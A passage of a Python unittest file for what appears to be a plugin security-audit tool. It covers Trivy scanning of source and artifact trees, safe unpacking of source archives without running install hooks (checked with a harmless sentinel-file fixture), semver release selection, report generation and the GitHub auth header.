            scan_path = Path(args[-1])
            scanned_paths.append(scan_path)
            if any(scan_path.rglob("package-lock.json")):
                return True, self._trivy_json([self._vuln("high")]), ""
            return True, self._trivy_json([]), ""

        with tempfile.TemporaryDirectory() as artifact_dir:
            with (
                patch("shutil.which", return_value="/usr/bin/trivy"),
                patch.object(ap, "_fetch_source_tree", side_effect=fake_fetch),
                patch.object(ap, "_run_scanner", side_effect=fake_scanner),
            ):
                status, findings = ap.run_trivy(
                    artifact_dir,
                    self._policy(),
                    source_repo=("owner", "plugin", "abc123"),
                )

        self.assertEqual(len(scanned_paths), 2)
        self.assertEqual(status.status, "found_issue")
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].path.startswith("source:"))
        self.assertIn("source", status.detail)
        self.assertIn("artifact", status.detail)

    def test_failed_source_fetch_is_not_reported_as_passed(self):
        with tempfile.TemporaryDirectory() as artifact_dir:
            with (
                patch("shutil.which", return_value="/usr/bin/trivy"),
                patch.object(
                    ap,
                    "_fetch_source_tree",
                    side_effect=RuntimeError("source fetch failed"),
                ),
                patch.object(
                    ap,
                    "_run_scanner",
                    return_value=(True, self._trivy_json([]), ""),
                ) as scanner,
            ):
                status, findings = ap.run_trivy(
                    artifact_dir,
                    self._policy(),
                    source_repo=("owner", "plugin", "abc123"),
                )

        self.assertEqual(status.status, "failed")
        self.assertEqual(findings, [])
        self.assertIn("source fetch failed", status.detail)
        scanner.assert_called_once()


class TestSourceTreeFetch(unittest.TestCase):
    def test_source_archive_is_materialized_without_executing_hooks(self):
        with tempfile.TemporaryDirectory() as td:
            sentinel = Path(td) / "executed"
            archive_path = Path(td) / "source.tar.gz"
            with tarfile.open(archive_path, "w:gz") as tf:
                files = {
                    "owner-plugin-abc123/package.json": json.dumps(
                        {
                            "scripts": {
                                "postinstall": f"touch {sentinel}",
                            }
                        }
                    ),
                    "owner-plugin-abc123/setup.py": (
                        f"from pathlib import Path\nPath({str(sentinel)!r}).touch()\n"
                    ),
                }
                for name, content in files.items():
                    raw = content.encode()
                    info = tarfile.TarInfo(name)
                    info.size = len(raw)
                    tf.addfile(info, io.BytesIO(raw))

            archive_bytes = archive_path.read_bytes()

            def fake_download(_owner, _repo, _commit_sha, destination, policy=None):
                del policy
                Path(destination).write_bytes(archive_bytes)

            destination = Path(td) / "source"
            with patch.object(
                ap, "_download_source_archive", side_effect=fake_download
            ):
                source_root = Path(
                    ap._fetch_source_tree("owner", "plugin", "abc123", destination)
                )

            self.assertTrue((source_root / "package.json").is_file())
            self.assertTrue((source_root / "setup.py").is_file())
            self.assertFalse(sentinel.exists())


# ---------------------------------------------------------------------------
# Shared release-selection (plugin_release_utils)
# ---------------------------------------------------------------------------


class TestPluginReleaseUtils(unittest.TestCase):
    """Tests for the shared release-selection logic."""

    def _rel(
        self,
        tag: str,
        prerelease: bool = False,
        zips: int = 1,
        published: str = "2024-01-01T00:00:00Z",
    ) -> dict:
        assets = [
            {"name": "plugin.zip", "browser_download_url": "https://x/plugin.zip"}
            for _ in range(zips)
        ]
        return {
            "tag_name": tag,
            "prerelease": prerelease,
            "assets": assets,
            "published_at": published,
        }

    def test_semver_order_v110_beats_v19(self):
        releases = [
            self._rel("v1.9.0"),
            self._rel("v1.10.0"),
        ]
        # Publication order: v1.9.0 first — semver ordering must win.
        result = pru.select_best_release(releases, allow_prerelease=False)
        self.assertEqual(result["tag_name"], "v1.10.0")

    def test_stable_beats_prerelease(self):
        releases = [
            self._rel("v2.0.0-beta.1", prerelease=True),
            self._rel("v1.0.0", prerelease=False),
        ]
        result = pru.select_best_release(releases, allow_prerelease=True)
        self.assertEqual(result["tag_name"], "v2.0.0-beta.1")

    def test_prerelease_eligible_for_testing_catalog(self):
        releases = [self._rel("v1.0.0-beta.1", prerelease=True)]
        result = pru.select_best_release(releases, allow_prerelease=True)
        self.assertIsNotNone(result)
        self.assertEqual(result["tag_name"], "v1.0.0-beta.1")

    def test_prerelease_excluded_from_stable_catalog(self):
        releases = [self._rel("v1.0.0-beta.1", prerelease=True)]
        result = pru.select_best_release(releases, allow_prerelease=False)
        self.assertIsNone(result)

    def test_zero_zips_excluded(self):
        releases = [self._rel("v2.0.0", zips=0), self._rel("v1.0.0", zips=1)]
        result = pru.select_best_release(releases, allow_prerelease=False)
        self.assertEqual(result["tag_name"], "v1.0.0")

    def test_multiple_zips_excluded(self):
        releases = [self._rel("v2.0.0", zips=2), self._rel("v1.0.0", zips=1)]
        result = pru.select_best_release(releases, allow_prerelease=False)
        self.assertEqual(result["tag_name"], "v1.0.0")

    def test_github_order_differs_from_semver(self):
        # GitHub returns newest by publication date; semver must win.
        releases = [
            self._rel("v1.0.1", published="2024-06-01T00:00:00Z"),
            self._rel("v2.0.0", published="2024-01-01T00:00:00Z"),
        ]
        result = pru.select_best_release(releases, allow_prerelease=False)
        self.assertEqual(result["tag_name"], "v2.0.0")

    def test_normalize_version_strips_v_prefix(self):
        self.assertEqual(pru.normalize_version("v1.2.3"), "1.2.3")

    def test_normalize_version_extracts_from_complex_tag(self):
        self.assertEqual(pru.normalize_version("release-0.7.1"), "0.7.1")

    def test_normalize_version_extracts_with_prerelease(self):
        result = pru.normalize_version("v1.0.0-beta.1")
        self.assertEqual(result, "1.0.0-beta.1")


# ---------------------------------------------------------------------------
# Empty-changed-repos report generation
# ---------------------------------------------------------------------------


class TestEmptyChangedRepos(unittest.TestCase):
    def test_changed_no_repos_writes_empty_reports(self):
        """--changed with no repos must produce empty JSON and Markdown reports."""
        with tempfile.TemporaryDirectory() as tmp:
            with (
                patch.object(ap, "load_policy", return_value=ap._default_policy()),
                patch.object(ap, "load_allowlist", return_value=[]),
                patch.object(ap, "get_changed_repos", return_value=[]),
            ):
                code = ap.main(
                    [
                        "--changed",
                        "--output-dir",
                        tmp,
                        "--plugins-file",
                        __file__,
                    ]
                )
            self.assertEqual(code, 0)
            json_path = os.path.join(tmp, "security-report.json")
            md_path = os.path.join(tmp, "security-report.md")
            self.assertTrue(os.path.exists(json_path))
            self.assertTrue(os.path.exists(md_path))
            data = json.loads(Path(json_path).read_text())
            self.assertEqual(data["report_count"], 0)
            self.assertEqual(data["reports"], [])
            md_content = Path(md_path).read_text()
            self.assertIn("No plugin repository changes were detected", md_content)


# ---------------------------------------------------------------------------
# GitHub Authorization header regression
# ---------------------------------------------------------------------------


class TestGitHubAuthHeader(unittest.TestCase):
    def test_auth_header_uses_bearer_token(self):
        """The Authorization header must use 'Bearer <token>', not a redacted placeholder."""
        import os as _os

        old = _os.environ.get("GITHUB_TOKEN")
        _os.environ["GITHUB_TOKEN"] = "my-real-token"
        try:
            session = ap._make_github_session()
            self.assertIn("Authorization", session.headers)
            auth = session.headers["Authorization"]
            self.assertTrue(
                auth.startswith("Bearer "), f"Expected 'Bearer <token>', got {auth!r}"
            )
            self.assertIn("my-real-token", auth)
        finally:
            if old is None:
                _os.environ.pop("GITHUB_TOKEN", None)
            else:
                _os.environ["GITHUB_TOKEN"] = old

    def test_no_auth_header_when_token_absent(self):
        """Without GITHUB_TOKEN, no Authorization header must be added."""
        import os as _os

        old = _os.environ.pop("GITHUB_TOKEN", None)
        try:
            session = ap._make_github_session()
            self.assertNotIn("Authorization", session.headers)
        finally:
            if old is not None:
                _os.environ["GITHUB_TOKEN"] = old


if __name__ == "__main__":
    unittest.main()
